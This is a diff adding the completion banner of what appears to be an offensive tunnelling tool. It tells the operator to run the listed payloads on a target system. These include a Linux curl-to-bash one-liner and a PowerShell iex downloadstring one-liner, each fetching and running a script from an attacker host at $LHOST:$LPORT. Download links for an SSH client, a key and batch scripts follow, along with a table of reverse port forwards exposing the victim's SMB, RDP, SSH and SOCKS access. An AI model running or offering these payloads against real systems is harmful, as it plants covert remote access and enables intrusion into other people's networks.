@@ -1,0 +1,31 @@
+===============================================================================
+Configuration complete. Start the web server if it is not already running.
+Then run one of the payloads below on a target system.
+___[ PAYLOADS ]________________________________________________________________
+Linux one-liner to download and execute:
+    curl -ks http://$LHOST:$LPORT/ssh-tunnel.sh | bash
+
+Windows PowerShell one-liner to download and execute:
+    powershell -c "iex (new-object net.webclient).downloadstring('http://$LHOST:$LPORT/ssh-tunnel.txt')"
+Windows download links for manual download and execution:
+    http://$LHOST:$LPORT/ssh.exe
+    http://$LHOST:$LPORT/libcrypto.dll
+    http://$LHOST:$LPORT/key.$SSHUSER.txt
+    http://$LHOST:$LPORT/ssh-tunnel.bat
+
+___[ DEFAULT PORT FORWARDS ]___________________________________________________
+SOCKS proxy to Windows network: 127.0.0.1:10000 (if supported by SSH client)
+SMB om remote Windows client:   127.0.0.1:10445
+RDP on remote Windows client:   127.0.0.1:13389
+Incoming 0.0.0.0:4444 --------> 127.0.0.1:14444
+Incoming 0.0.0.0:8080 --------> 127.0.0.1:18080
+Incoming 0.0.0.0:8443 --------> 127.0.0.1:18443
+Incoming 0.0.0.0:8888 --------> 127.0.0.1:18888
+
+SOCKS proxy to Linux network:   127.0.0.1:20000 (if supported by SSH client)
+SSH on remote Linux client:     127.0.0.1:20022
+Incoming 0.0.0.0:4444 --------> 127.0.0.1:24444
+Incoming 0.0.0.0:8080 --------> 127.0.0.1:28080
+Incoming 0.0.0.0:8443 --------> 127.0.0.1:28443
+Incoming 0.0.0.0:8888 --------> 127.0.0.1:28888
+===============================================================================
